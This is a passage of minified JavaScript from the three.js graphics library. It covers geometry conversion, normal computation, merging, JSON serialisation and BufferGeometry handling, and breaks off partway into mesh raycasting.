y=w.vertexNormals;3===y.length?this.normals.push(y[0],y[1],y[2]):(y=w.normal,this.normals.push(y,y,y));y=w.vertexColors;3===y.length?this.colors.push(y[0],y[1],y[2]):(y=w.color,this.colors.push(y,y,y));!0===e&&(y=d[0][k],void 0!==y?this.uvs.push(y[0],\ny[1],y[2]):(console.warn(\"THREE.DirectGeometry.fromGeometry(): Undefined vertexUv \",k),this.uvs.push(new D,new D,new D)));!0===f&&(y=d[1][k],void 0!==y?this.uvs2.push(y[0],y[1],y[2]):(console.warn(\"THREE.DirectGeometry.fromGeometry(): Undefined vertexUv2 \",k),this.uvs2.push(new D,new D,new D)));for(y=0;y<h;y++){var K=g[y].vertices;m[y].push(K[w.a],K[w.b],K[w.c])}for(y=0;y<p;y++)K=l[y].vertexNormals[k],n[y].push(K.a,K.b,K.c);r&&this.skinIndices.push(u[w.a],u[w.b],u[w.c]);A&&this.skinWeights.push(q[w.a],\nq[w.b],q[w.c])}this.computeGroups(a);this.verticesNeedUpdate=a.verticesNeedUpdate;this.normalsNeedUpdate=a.normalsNeedUpdate;this.colorsNeedUpdate=a.colorsNeedUpdate;this.uvsNeedUpdate=a.uvsNeedUpdate;this.groupsNeedUpdate=a.groupsNeedUpdate;return this}});var Vd=0;T.prototype={constructor:T,isGeometry:!0,applyMatrix:function(a){for(var b=(new ya).getNormalMatrix(a),c=0,d=this.vertices.length;c<d;c++)this.vertices[c].applyMatrix4(a);c=0;for(d=this.faces.length;c<d;c++){a=this.faces[c];a.normal.applyMatrix3(b).normalize();\nfor(var e=0,f=a.vertexNormals.length;e<f;e++)a.vertexNormals[e].applyMatrix3(b).normalize()}null!==this.boundingBox&&this.computeBoundingBox();null!==this.boundingSphere&&this.computeBoundingSphere();this.normalsNeedUpdate=this.verticesNeedUpdate=!0;return this},rotateX:function(){var a;return function(b){void 0===a&&(a=new S);a.makeRotationX(b);this.applyMatrix(a);return this}}(),rotateY:function(){var a;return function(b){void 0===a&&(a=new S);a.makeRotationY(b);this.applyMatrix(a);return this}}(),\nrotateZ:function(){var a;return function(b){void 0===a&&(a=new S);a.makeRotationZ(b);this.applyMatrix(a);return this}}(),translate:function(){var a;return function(b,c,d){void 0===a&&(a=new S);a.makeTranslation(b,c,d);this.applyMatrix(a);return this}}(),scale:function(){var a;return function(b,c,d){void 0===a&&(a=new S);a.makeScale(b,c,d);this.applyMatrix(a);return this}}(),lookAt:function(){var a;return function(b){void 0===a&&(a=new x);a.lookAt(b);a.updateMatrix();this.applyMatrix(a.matrix)}}(),\nfromBufferGeometry:function(a){function b(a,b,d,e){var f=void 0!==g?[l[a].clone(),l[b].clone(),l[d].clone()]:[],u=void 0!==h?[c.colors[a].clone(),c.colors[b].clone(),c.colors[d].clone()]:[];e=new ha(a,b,d,f,u,e);c.faces.push(e);void 0!==m&&c.faceVertexUvs[0].push([p[a].clone(),p[b].clone(),p[d].clone()]);void 0!==k&&c.faceVertexUvs[1].push([n[a].clone(),n[b].clone(),n[d].clone()])}var c=this,d=null!==a.index?a.index.array:void 0,e=a.attributes,f=e.position.array,g=void 0!==e.normal?e.normal.array:\nvoid 0,h=void 0!==e.color?e.color.array:void 0,m=void 0!==e.uv?e.uv.array:void 0,k=void 0!==e.uv2?e.uv2.array:void 0;void 0!==k&&(this.faceVertexUvs[1]=[]);for(var l=[],p=[],n=[],u=e=0;e<f.length;e+=3,u+=2)c.vertices.push(new q(f[e],f[e+1],f[e+2])),void 0!==g&&l.push(new q(g[e],g[e+1],g[e+2])),void 0!==h&&c.colors.push(new J(h[e],h[e+1],h[e+2])),void 0!==m&&p.push(new D(m[u],m[u+1])),void 0!==k&&n.push(new D(k[u],k[u+1]));if(void 0!==d)if(f=a.groups,0<f.length)for(e=0;e<f.length;e++)for(var G=f[e],\nr=G.start,A=G.count,u=r,r=r+A;u<r;u+=3)b(d[u],d[u+1],d[u+2],G.materialIndex);else for(e=0;e<d.length;e+=3)b(d[e],d[e+1],d[e+2]);else for(e=0;e<f.length/3;e+=3)b(e,e+1,e+2);this.computeFaceNormals();null!==a.boundingBox&&(this.boundingBox=a.boundingBox.clone());null!==a.boundingSphere&&(this.boundingSphere=a.boundingSphere.clone());return this},center:function(){this.computeBoundingBox();var a=this.boundingBox.getCenter().negate();this.translate(a.x,a.y,a.z);return a},normalize:function(){this.computeBoundingSphere();\nvar a=this.boundingSphere.center,b=this.boundingSphere.radius,b=0===b?1:1/b,c=new S;c.set(b,0,0,-b*a.x,0,b,0,-b*a.y,0,0,b,-b*a.z,0,0,0,1);this.applyMatrix(c);return this},computeFaceNormals:function(){for(var a=new q,b=new q,c=0,d=this.faces.length;c<d;c++){var e=this.faces[c],f=this.vertices[e.a],g=this.vertices[e.b];a.subVectors(this.vertices[e.c],g);b.subVectors(f,g);a.cross(b);a.normalize();e.normal.copy(a)}},computeVertexNormals:function(a){void 0===a&&(a=!0);var b,c,d;d=Array(this.vertices.length);\nb=0;for(c=this.vertices.length;b<c;b++)d[b]=new q;if(a){var e,f,g,h=new q,m=new q;a=0;for(b=this.faces.length;a<b;a++)c=this.faces[a],e=this.vertices[c.a],f=this.vertices[c.b],g=this.vertices[c.c],h.subVectors(g,f),m.subVectors(e,f),h.cross(m),d[c.a].add(h),d[c.b].add(h),d[c.c].add(h)}else for(this.computeFaceNormals(),a=0,b=this.faces.length;a<b;a++)c=this.faces[a],d[c.a].add(c.normal),d[c.b].add(c.normal),d[c.c].add(c.normal);b=0;for(c=this.vertices.length;b<c;b++)d[b].normalize();a=0;for(b=this.faces.length;a<\nb;a++)c=this.faces[a],e=c.vertexNormals,3===e.length?(e[0].copy(d[c.a]),e[1].copy(d[c.b]),e[2].copy(d[c.c])):(e[0]=d[c.a].clone(),e[1]=d[c.b].clone(),e[2]=d[c.c].clone());0<this.faces.length&&(this.normalsNeedUpdate=!0)},computeFlatVertexNormals:function(){var a,b,c;this.computeFaceNormals();a=0;for(b=this.faces.length;a<b;a++){c=this.faces[a];var d=c.vertexNormals;3===d.length?(d[0].copy(c.normal),d[1].copy(c.normal),d[2].copy(c.normal)):(d[0]=c.normal.clone(),d[1]=c.normal.clone(),d[2]=c.normal.clone())}0<\nthis.faces.length&&(this.normalsNeedUpdate=!0)},computeMorphNormals:function(){var a,b,c,d,e;c=0;for(d=this.faces.length;c<d;c++)for(e=this.faces[c],e.__originalFaceNormal?e.__originalFaceNormal.copy(e.normal):e.__originalFaceNormal=e.normal.clone(),e.__originalVertexNormals||(e.__originalVertexNormals=[]),a=0,b=e.vertexNormals.length;a<b;a++)e.__originalVertexNormals[a]?e.__originalVertexNormals[a].copy(e.vertexNormals[a]):e.__originalVertexNormals[a]=e.vertexNormals[a].clone();var f=new T;f.faces=\nthis.faces;a=0;for(b=this.morphTargets.length;a<b;a++){if(!this.morphNormals[a]){this.morphNormals[a]={};this.morphNormals[a].faceNormals=[];this.morphNormals[a].vertexNormals=[];e=this.morphNormals[a].faceNormals;var g=this.morphNormals[a].vertexNormals,h,m;c=0;for(d=this.faces.length;c<d;c++)h=new q,m={a:new q,b:new q,c:new q},e.push(h),g.push(m)}g=this.morphNormals[a];f.vertices=this.morphTargets[a].vertices;f.computeFaceNormals();f.computeVertexNormals();c=0;for(d=this.faces.length;c<d;c++)e=\nthis.faces[c],h=g.faceNormals[c],m=g.vertexNormals[c],h.copy(e.normal),m.a.copy(e.vertexNormals[0]),m.b.copy(e.vertexNormals[1]),m.c.copy(e.vertexNormals[2])}c=0;for(d=this.faces.length;c<d;c++)e=this.faces[c],e.normal=e.__originalFaceNormal,e.vertexNormals=e.__originalVertexNormals},computeLineDistances:function(){for(var a=0,b=this.vertices,c=0,d=b.length;c<d;c++)0<c&&(a+=b[c].distanceTo(b[c-1])),this.lineDistances[c]=a},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new Pa);\nthis.boundingBox.setFromPoints(this.vertices)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new Na);this.boundingSphere.setFromPoints(this.vertices)},merge:function(a,b,c){if(!1===(a&&a.isGeometry))console.error(\"THREE.Geometry.merge(): geometry not an instance of THREE.Geometry.\",a);else{var d,e=this.vertices.length,f=this.vertices,g=a.vertices,h=this.faces,m=a.faces,k=this.faceVertexUvs[0],l=a.faceVertexUvs[0],p=this.colors,n=a.colors;void 0===c&&(c=0);void 0!==\nb&&(d=(new ya).getNormalMatrix(b));a=0;for(var u=g.length;a<u;a++){var q=g[a].clone();void 0!==b&&q.applyMatrix4(b);f.push(q)}a=0;for(u=n.length;a<u;a++)p.push(n[a].clone());a=0;for(u=m.length;a<u;a++){var g=m[a],r=g.vertexNormals,n=g.vertexColors,p=new ha(g.a+e,g.b+e,g.c+e);p.normal.copy(g.normal);void 0!==d&&p.normal.applyMatrix3(d).normalize();b=0;for(f=r.length;b<f;b++)q=r[b].clone(),void 0!==d&&q.applyMatrix3(d).normalize(),p.vertexNormals.push(q);p.color.copy(g.color);b=0;for(f=n.length;b<f;b++)q=\nn[b],p.vertexColors.push(q.clone());p.materialIndex=g.materialIndex+c;h.push(p)}a=0;for(u=l.length;a<u;a++)if(c=l[a],d=[],void 0!==c){b=0;for(f=c.length;b<f;b++)d.push(c[b].clone());k.push(d)}}},mergeMesh:function(a){!1===(a&&a.isMesh)?console.error(\"THREE.Geometry.mergeMesh(): mesh not an instance of THREE.Mesh.\",a):(a.matrixAutoUpdate&&a.updateMatrix(),this.merge(a.geometry,a.matrix))},mergeVertices:function(){var a={},b=[],c=[],d,e=Math.pow(10,4),f,g;f=0;for(g=this.vertices.length;f<g;f++)d=this.vertices[f],\nd=Math.round(d.x*e)+\"_\"+Math.round(d.y*e)+\"_\"+Math.round(d.z*e),void 0===a[d]?(a[d]=f,b.push(this.vertices[f]),c[f]=b.length-1):c[f]=c[a[d]];a=[];f=0;for(g=this.faces.length;f<g;f++)for(e=this.faces[f],e.a=c[e.a],e.b=c[e.b],e.c=c[e.c],e=[e.a,e.b,e.c],d=0;3>d;d++)if(e[d]===e[(d+1)%3]){a.push(f);break}for(f=a.length-1;0<=f;f--)for(e=a[f],this.faces.splice(e,1),c=0,g=this.faceVertexUvs.length;c<g;c++)this.faceVertexUvs[c].splice(e,1);f=this.vertices.length-b.length;this.vertices=b;return f},sortFacesByMaterialIndex:function(){for(var a=\nthis.faces,b=a.length,c=0;c<b;c++)a[c]._id=c;a.sort(function(a,b){return a.materialIndex-b.materialIndex});var d=this.faceVertexUvs[0],e=this.faceVertexUvs[1],f,g;d&&d.length===b&&(f=[]);e&&e.length===b&&(g=[]);for(c=0;c<b;c++){var h=a[c]._id;f&&f.push(d[h]);g&&g.push(e[h])}f&&(this.faceVertexUvs[0]=f);g&&(this.faceVertexUvs[1]=g)},toJSON:function(){function a(a,b,c){return c?a|1<<b:a&~(1<<b)}function b(a){var b=a.x.toString()+a.y.toString()+a.z.toString();if(void 0!==k[b])return k[b];k[b]=m.length/\n3;m.push(a.x,a.y,a.z);return k[b]}function c(a){var b=a.r.toString()+a.g.toString()+a.b.toString();if(void 0!==p[b])return p[b];p[b]=l.length;l.push(a.getHex());return p[b]}function d(a){var b=a.x.toString()+a.y.toString();if(void 0!==u[b])return u[b];u[b]=n.length/2;n.push(a.x,a.y);return u[b]}var e={metadata:{version:4.4,type:\"Geometry\",generator:\"Geometry.toJSON\"}};e.uuid=this.uuid;e.type=this.type;\"\"!==this.name&&(e.name=this.name);if(void 0!==this.parameters){var f=this.parameters,g;for(g in f)void 0!==\nf[g]&&(e[g]=f[g]);return e}f=[];for(g=0;g<this.vertices.length;g++){var h=this.vertices[g];f.push(h.x,h.y,h.z)}var h=[],m=[],k={},l=[],p={},n=[],u={};for(g=0;g<this.faces.length;g++){var q=this.faces[g],r=void 0!==this.faceVertexUvs[0][g],A=0<q.normal.length(),w=0<q.vertexNormals.length,y=1!==q.color.r||1!==q.color.g||1!==q.color.b,K=0<q.vertexColors.length,v=0,v=a(v,0,0),v=a(v,1,!0),v=a(v,2,!1),v=a(v,3,r),v=a(v,4,A),v=a(v,5,w),v=a(v,6,y),v=a(v,7,K);h.push(v);h.push(q.a,q.b,q.c);h.push(q.materialIndex);\nr&&(r=this.faceVertexUvs[0][g],h.push(d(r[0]),d(r[1]),d(r[2])));A&&h.push(b(q.normal));w&&(A=q.vertexNormals,h.push(b(A[0]),b(A[1]),b(A[2])));y&&h.push(c(q.color));K&&(q=q.vertexColors,h.push(c(q[0]),c(q[1]),c(q[2])))}e.data={};e.data.vertices=f;e.data.normals=m;0<l.length&&(e.data.colors=l);0<n.length&&(e.data.uvs=[n]);e.data.faces=h;return e},clone:function(){return(new T).copy(this)},copy:function(a){var b,c,d,e,f,g;this.vertices=[];this.colors=[];this.faces=[];this.faceVertexUvs=[[]];this.morphTargets=\n[];this.morphNormals=[];this.skinWeights=[];this.skinIndices=[];this.lineDistances=[];this.boundingSphere=this.boundingBox=null;this.name=a.name;d=a.vertices;b=0;for(c=d.length;b<c;b++)this.vertices.push(d[b].clone());d=a.colors;b=0;for(c=d.length;b<c;b++)this.colors.push(d[b].clone());d=a.faces;b=0;for(c=d.length;b<c;b++)this.faces.push(d[b].clone());b=0;for(c=a.faceVertexUvs.length;b<c;b++){var h=a.faceVertexUvs[b];void 0===this.faceVertexUvs[b]&&(this.faceVertexUvs[b]=[]);d=0;for(e=h.length;d<\ne;d++){var m=h[d],k=[];f=0;for(g=m.length;f<g;f++)k.push(m[f].clone());this.faceVertexUvs[b].push(k)}}f=a.morphTargets;b=0;for(c=f.length;b<c;b++){g={};g.name=f[b].name;if(void 0!==f[b].vertices)for(g.vertices=[],d=0,e=f[b].vertices.length;d<e;d++)g.vertices.push(f[b].vertices[d].clone());if(void 0!==f[b].normals)for(g.normals=[],d=0,e=f[b].normals.length;d<e;d++)g.normals.push(f[b].normals[d].clone());this.morphTargets.push(g)}f=a.morphNormals;b=0;for(c=f.length;b<c;b++){g={};if(void 0!==f[b].vertexNormals)for(g.vertexNormals=\n[],d=0,e=f[b].vertexNormals.length;d<e;d++)h=f[b].vertexNormals[d],m={},m.a=h.a.clone(),m.b=h.b.clone(),m.c=h.c.clone(),g.vertexNormals.push(m);if(void 0!==f[b].faceNormals)for(g.faceNormals=[],d=0,e=f[b].faceNormals.length;d<e;d++)g.faceNormals.push(f[b].faceNormals[d].clone());this.morphNormals.push(g)}d=a.skinWeights;b=0;for(c=d.length;b<c;b++)this.skinWeights.push(d[b].clone());d=a.skinIndices;b=0;for(c=d.length;b<c;b++)this.skinIndices.push(d[b].clone());d=a.lineDistances;b=0;for(c=d.length;b<\nc;b++)this.lineDistances.push(d[b]);b=a.boundingBox;null!==b&&(this.boundingBox=b.clone());b=a.boundingSphere;null!==b&&(this.boundingSphere=b.clone());this.elementsNeedUpdate=a.elementsNeedUpdate;this.verticesNeedUpdate=a.verticesNeedUpdate;this.uvsNeedUpdate=a.uvsNeedUpdate;this.normalsNeedUpdate=a.normalsNeedUpdate;this.colorsNeedUpdate=a.colorsNeedUpdate;this.lineDistancesNeedUpdate=a.lineDistancesNeedUpdate;this.groupsNeedUpdate=a.groupsNeedUpdate;return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}};\nObject.assign(T.prototype,pa.prototype);I.prototype={constructor:I,isBufferGeometry:!0,getIndex:function(){return this.index},setIndex:function(a){Array.isArray(a)?this.index=new (65535<Ud(a)?jb:ib)(a,1):this.index=a},addAttribute:function(a,b,c){if(!1===(b&&b.isBufferAttribute)&&!1===(b&&b.isInterleavedBufferAttribute))console.warn(\"THREE.BufferGeometry: .addAttribute() now expects ( name, attribute ).\"),this.addAttribute(a,new U(b,c));else if(\"index\"===a)console.warn(\"THREE.BufferGeometry.addAttribute: Use .setIndex() for index attribute.\"),\nthis.setIndex(b);else return this.attributes[a]=b,this},getAttribute:function(a){return this.attributes[a]},removeAttribute:function(a){delete this.attributes[a];return this},addGroup:function(a,b,c){this.groups.push({start:a,count:b,materialIndex:void 0!==c?c:0})},clearGroups:function(){this.groups=[]},setDrawRange:function(a,b){this.drawRange.start=a;this.drawRange.count=b},applyMatrix:function(a){var b=this.attributes.position;void 0!==b&&(a.applyToBufferAttribute(b),b.needsUpdate=!0);b=this.attributes.normal;\nvoid 0!==b&&((new ya).getNormalMatrix(a).applyToBufferAttribute(b),b.needsUpdate=!0);null!==this.boundingBox&&this.computeBoundingBox();null!==this.boundingSphere&&this.computeBoundingSphere();return this},rotateX:function(){var a;return function(b){void 0===a&&(a=new S);a.makeRotationX(b);this.applyMatrix(a);return this}}(),rotateY:function(){var a;return function(b){void 0===a&&(a=new S);a.makeRotationY(b);this.applyMatrix(a);return this}}(),rotateZ:function(){var a;return function(b){void 0===\na&&(a=new S);a.makeRotationZ(b);this.applyMatrix(a);return this}}(),translate:function(){var a;return function(b,c,d){void 0===a&&(a=new S);a.makeTranslation(b,c,d);this.applyMatrix(a);return this}}(),scale:function(){var a;return function(b,c,d){void 0===a&&(a=new S);a.makeScale(b,c,d);this.applyMatrix(a);return this}}(),lookAt:function(){var a;return function(b){void 0===a&&(a=new x);a.lookAt(b);a.updateMatrix();this.applyMatrix(a.matrix)}}(),center:function(){this.computeBoundingBox();var a=this.boundingBox.getCenter().negate();\nthis.translate(a.x,a.y,a.z);return a},setFromObject:function(a){var b=a.geometry;if(a.isPoints||a.isLine){a=new z(3*b.vertices.length,3);var c=new z(3*b.colors.length,3);this.addAttribute(\"position\",a.copyVector3sArray(b.vertices));this.addAttribute(\"color\",c.copyColorsArray(b.colors));b.lineDistances&&b.lineDistances.length===b.vertices.length&&(a=new z(b.lineDistances.length,1),this.addAttribute(\"lineDistance\",a.copyArray(b.lineDistances)));null!==b.boundingSphere&&(this.boundingSphere=b.boundingSphere.clone());\nnull!==b.boundingBox&&(this.boundingBox=b.boundingBox.clone())}else a.isMesh&&b&&b.isGeometry&&this.fromGeometry(b);return this},updateFromObject:function(a){var b=a.geometry;if(a.isMesh){var c=b.__directGeometry;!0===b.elementsNeedUpdate&&(c=void 0,b.elementsNeedUpdate=!1);if(void 0===c)return this.fromGeometry(b);c.verticesNeedUpdate=b.verticesNeedUpdate;c.normalsNeedUpdate=b.normalsNeedUpdate;c.colorsNeedUpdate=b.colorsNeedUpdate;c.uvsNeedUpdate=b.uvsNeedUpdate;c.groupsNeedUpdate=b.groupsNeedUpdate;\nb.verticesNeedUpdate=!1;b.normalsNeedUpdate=!1;b.colorsNeedUpdate=!1;b.uvsNeedUpdate=!1;b.groupsNeedUpdate=!1;b=c}!0===b.verticesNeedUpdate&&(c=this.attributes.position,void 0!==c&&(c.copyVector3sArray(b.vertices),c.needsUpdate=!0),b.verticesNeedUpdate=!1);!0===b.normalsNeedUpdate&&(c=this.attributes.normal,void 0!==c&&(c.copyVector3sArray(b.normals),c.needsUpdate=!0),b.normalsNeedUpdate=!1);!0===b.colorsNeedUpdate&&(c=this.attributes.color,void 0!==c&&(c.copyColorsArray(b.colors),c.needsUpdate=!0),\nb.colorsNeedUpdate=!1);b.uvsNeedUpdate&&(c=this.attributes.uv,void 0!==c&&(c.copyVector2sArray(b.uvs),c.needsUpdate=!0),b.uvsNeedUpdate=!1);b.lineDistancesNeedUpdate&&(c=this.attributes.lineDistance,void 0!==c&&(c.copyArray(b.lineDistances),c.needsUpdate=!0),b.lineDistancesNeedUpdate=!1);b.groupsNeedUpdate&&(b.computeGroups(a.geometry),this.groups=b.groups,b.groupsNeedUpdate=!1);return this},fromGeometry:function(a){a.__directGeometry=(new Me).fromGeometry(a);return this.fromDirectGeometry(a.__directGeometry)},\nfromDirectGeometry:function(a){var b=new Float32Array(3*a.vertices.length);this.addAttribute(\"position\",(new U(b,3)).copyVector3sArray(a.vertices));0<a.normals.length&&(b=new Float32Array(3*a.normals.length),this.addAttribute(\"normal\",(new U(b,3)).copyVector3sArray(a.normals)));0<a.colors.length&&(b=new Float32Array(3*a.colors.length),this.addAttribute(\"color\",(new U(b,3)).copyColorsArray(a.colors)));0<a.uvs.length&&(b=new Float32Array(2*a.uvs.length),this.addAttribute(\"uv\",(new U(b,2)).copyVector2sArray(a.uvs)));\n0<a.uvs2.length&&(b=new Float32Array(2*a.uvs2.length),this.addAttribute(\"uv2\",(new U(b,2)).copyVector2sArray(a.uvs2)));0<a.indices.length&&(b=new (65535<Ud(a.indices)?Uint32Array:Uint16Array)(3*a.indices.length),this.setIndex((new U(b,1)).copyIndicesArray(a.indices)));this.groups=a.groups;for(var c in a.morphTargets){for(var b=[],d=a.morphTargets[c],e=0,f=d.length;e<f;e++){var g=d[e],h=new z(3*g.length,3);b.push(h.copyVector3sArray(g))}this.morphAttributes[c]=b}0<a.skinIndices.length&&(c=new z(4*\na.skinIndices.length,4),this.addAttribute(\"skinIndex\",c.copyVector4sArray(a.skinIndices)));0<a.skinWeights.length&&(c=new z(4*a.skinWeights.length,4),this.addAttribute(\"skinWeight\",c.copyVector4sArray(a.skinWeights)));null!==a.boundingSphere&&(this.boundingSphere=a.boundingSphere.clone());null!==a.boundingBox&&(this.boundingBox=a.boundingBox.clone());return this},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new Pa);var a=this.attributes.position;void 0!==a?this.boundingBox.setFromBufferAttribute(a):\nthis.boundingBox.makeEmpty();(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&console.error('THREE.BufferGeometry.computeBoundingBox: Computed min/max have NaN values. The \"position\" attribute is likely to have NaN values.',this)},computeBoundingSphere:function(){var a=new Pa,b=new q;return function(){null===this.boundingSphere&&(this.boundingSphere=new Na);var c=this.attributes.position;if(c){var d=this.boundingSphere.center;a.setFromBufferAttribute(c);\na.getCenter(d);for(var e=0,f=0,g=c.count;f<g;f++)b.x=c.getX(f),b.y=c.getY(f),b.z=c.getZ(f),e=Math.max(e,d.distanceToSquared(b));this.boundingSphere.radius=Math.sqrt(e);isNaN(this.boundingSphere.radius)&&console.error('THREE.BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The \"position\" attribute is likely to have NaN values.',this)}}}(),computeFaceNormals:function(){},computeVertexNormals:function(){var a=this.index,b=this.attributes,c=this.groups;if(b.position){var d=b.position.array;\nif(void 0===b.normal)this.addAttribute(\"normal\",new U(new Float32Array(d.length),3));else for(var e=b.normal.array,f=0,g=e.length;f<g;f++)e[f]=0;var e=b.normal.array,h,m,k,l=new q,p=new q,n=new q,u=new q,G=new q;if(a){a=a.array;0===c.length&&this.addGroup(0,a.length);for(var r=0,A=c.length;r<A;++r)for(f=c[r],g=f.start,h=f.count,f=g,g+=h;f<g;f+=3)h=3*a[f+0],m=3*a[f+1],k=3*a[f+2],l.fromArray(d,h),p.fromArray(d,m),n.fromArray(d,k),u.subVectors(n,p),G.subVectors(l,p),u.cross(G),e[h]+=u.x,e[h+1]+=u.y,\ne[h+2]+=u.z,e[m]+=u.x,e[m+1]+=u.y,e[m+2]+=u.z,e[k]+=u.x,e[k+1]+=u.y,e[k+2]+=u.z}else for(f=0,g=d.length;f<g;f+=9)l.fromArray(d,f),p.fromArray(d,f+3),n.fromArray(d,f+6),u.subVectors(n,p),G.subVectors(l,p),u.cross(G),e[f]=u.x,e[f+1]=u.y,e[f+2]=u.z,e[f+3]=u.x,e[f+4]=u.y,e[f+5]=u.z,e[f+6]=u.x,e[f+7]=u.y,e[f+8]=u.z;this.normalizeNormals();b.normal.needsUpdate=!0}},merge:function(a,b){if(!1===(a&&a.isBufferGeometry))console.error(\"THREE.BufferGeometry.merge(): geometry not an instance of THREE.BufferGeometry.\",\na);else{void 0===b&&(b=0);var c=this.attributes,d;for(d in c)if(void 0!==a.attributes[d])for(var e=c[d].array,f=a.attributes[d],g=f.array,h=0,f=f.itemSize*b;h<g.length;h++,f++)e[f]=g[h];return this}},normalizeNormals:function(){for(var a=this.attributes.normal.array,b,c,d,e=0,f=a.length;e<f;e+=3)b=a[e],c=a[e+1],d=a[e+2],b=1/Math.sqrt(b*b+c*c+d*d),a[e]*=b,a[e+1]*=b,a[e+2]*=b},toNonIndexed:function(){if(null===this.index)return console.warn(\"THREE.BufferGeometry.toNonIndexed(): Geometry is already non-indexed.\"),\nthis;var a=new I,b=this.index.array,c=this.attributes,d;for(d in c){for(var e=c[d],f=e.array,e=e.itemSize,g=new f.constructor(b.length*e),h,m=0,k=0,l=b.length;k<l;k++){h=b[k]*e;for(var p=0;p<e;p++)g[m++]=f[h++]}a.addAttribute(d,new U(g,e))}return a},toJSON:function(){var a={metadata:{version:4.4,type:\"BufferGeometry\",generator:\"BufferGeometry.toJSON\"}};a.uuid=this.uuid;a.type=this.type;\"\"!==this.name&&(a.name=this.name);if(void 0!==this.parameters){var b=this.parameters,c;for(c in b)void 0!==b[c]&&\n(a[c]=b[c]);return a}a.data={attributes:{}};var d=this.index;null!==d&&(b=Array.prototype.slice.call(d.array),a.data.index={type:d.array.constructor.name,array:b});d=this.attributes;for(c in d){var e=d[c],b=Array.prototype.slice.call(e.array);a.data.attributes[c]={itemSize:e.itemSize,type:e.array.constructor.name,array:b,normalized:e.normalized}}c=this.groups;0<c.length&&(a.data.groups=JSON.parse(JSON.stringify(c)));c=this.boundingSphere;null!==c&&(a.data.boundingSphere={center:c.center.toArray(),\nradius:c.radius});return a},clone:function(){return(new I).copy(this)},copy:function(a){var b,c,d;this.index=null;this.attributes={};this.morphAttributes={};this.groups=[];this.boundingSphere=this.boundingBox=null;this.name=a.name;c=a.index;null!==c&&this.setIndex(c.clone());c=a.attributes;for(b in c)this.addAttribute(b,c[b].clone());var e=a.morphAttributes;for(b in e){var f=[],g=e[b];c=0;for(d=g.length;c<d;c++)f.push(g[c].clone());this.morphAttributes[b]=f}b=a.groups;c=0;for(d=b.length;c<d;c++)e=\nb[c],this.addGroup(e.start,e.count,e.materialIndex);b=a.boundingBox;null!==b&&(this.boundingBox=b.clone());b=a.boundingSphere;null!==b&&(this.boundingSphere=b.clone());this.drawRange.start=a.drawRange.start;this.drawRange.count=a.drawRange.count;return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}};I.MaxIndex=65535;Object.assign(I.prototype,pa.prototype);Aa.prototype=Object.assign(Object.create(x.prototype),{constructor:Aa,isMesh:!0,setDrawMode:function(a){this.drawMode=a},copy:function(a){x.prototype.copy.call(this,\na);this.drawMode=a.drawMode;return this},updateMorphTargets:function(){var a=this.geometry.morphTargets;if(void 0!==a&&0<a.length){this.morphTargetInfluences=[];this.morphTargetDictionary={};for(var b=0,c=a.length;b<c;b++)this.morphTargetInfluences.push(0),this.morphTargetDictionary[a[b].name]=b}},raycast:function(){function a(a,b,c,d,e,f,g){za.barycoordFromPoint(a,b,c,d,r);e.multiplyScalar(r.x);f.multiplyScalar(r.y);g.multiplyScalar(r.z);e.add(f).add(g);return e.clone()}function b(a,b,c,d,e,f,g){var h=\na.material;if(null===(1===h.side?c.intersectTriangle(f,e,d,!0,g):c.intersectTriangle(d,e,f,2!==h.side,g)))return null;w.copy(g);w.applyMatrix4(a.matrixWorld);c=b.ray.origin.distanceTo(w);return c<b.near||c>b.far?null:{distance:c,point:w.clone(),object:a}}function c(c,d,e,f,k,l,p,t){g.fromBufferAttribute(f,l);h.fromBufferAttribute(f,p);m.fromBufferAttribute(f,t);if(c=b(c,d,e,g,h,m,A))k&&(n.fromBufferAttribute(k,l),u.fromBufferAttribute(k,p),G.fromBufferAttribute(k,t),c.uv=a(A,g,h,m,n,u,G)),c.face=\nnew ha(l,p,t,za.normal(g,h,m)),c.faceIndex=l;return c}var d=new S,e=new cb,f=new Na,g=new q,h=new q,m=new q,k=new q,l=new q,p=new q,n=new D,u=new D,G=new D,r=new q,A=new q,w=new q;return function(q,r){var v=this.geometry,w=this.material,L=this.matrixWorld;if(void 0!==w&&(null===v.boundingSphere&&v.computeBoundingSphere(),f.copy(v.boundingSphere),f.applyMatrix4(L),!1!==q.ray.intersectsSphere(f)&&(d.getInverse(L),e.copy(q.ray).applyMatrix4(d),null===v.boundingBox||!1!==e.intersectsBox(v.boundingBox)))){var C;\nif(v.isBufferGeometry){var F,x,w=v.index,H=v.attributes.position,L=v.attributes.uv,D,z;if(null!==w)for(D=0,z=w.count;D<z;D+=3){if(v=w.getX(D),F=w.getX(D+1),x=w.getX(D+2),C=c(this,q,e,H,L,v,F,x))C.faceIndex=Math.floor(D/3),r.push(C)}else for(D=0,z=H.count;D<z;D+=3)if(v=D,F=D+1,x=D+2,C=c(this,q,e,H,L,v,F,x))C.index=v,r.push(C)}else if(v.isGeometry){var J,I,L=w&&w.isMultiMaterial;D=!0===L?w.materials:null;z=v.vertices;F=v.faces;x=v.faceVertexUvs[0];0<x.length&&(H=x);for(var Q=0,M=F.length;Q<M;Q++){var O=\nF[Q];C=!0===L?D[O.materialIndex]:w;if(void 0!==C){x=z[O.a];J=z[O.b];I=z[O.c];if(!0===C.morphTargets){C=v.morphTargets;var P=this.morphTargetInfluences;g.set(0,0,0);h.set(0,0,0);m.set(0,0,0);for(var T=0,W=C.length;T<W;T++){var S=P[T];if(0!==S){var R=C[T].vertices;g.addScaledVector(k.subVectors(R[O.a],x),S);h.addScaledVector(l.subVectors(R[O.b],J),S);m.addScaledVector(p.subVectors(R[O.c],I),S)}}g.add(x);h.add(J);m.add(I);x=g;J=h;I=m}if(C=b(this,q,e,x,J,I,A))H&&(P=H[Q],n.copy(P[0]),u.copy(P[1]),G.copy(P[2]),\nC.uv=a(A,x,J,I,n,u,G)),C.face=O,C.faceIndex=Q,r.push(C)}}}}}}(),clone:function(){return(new 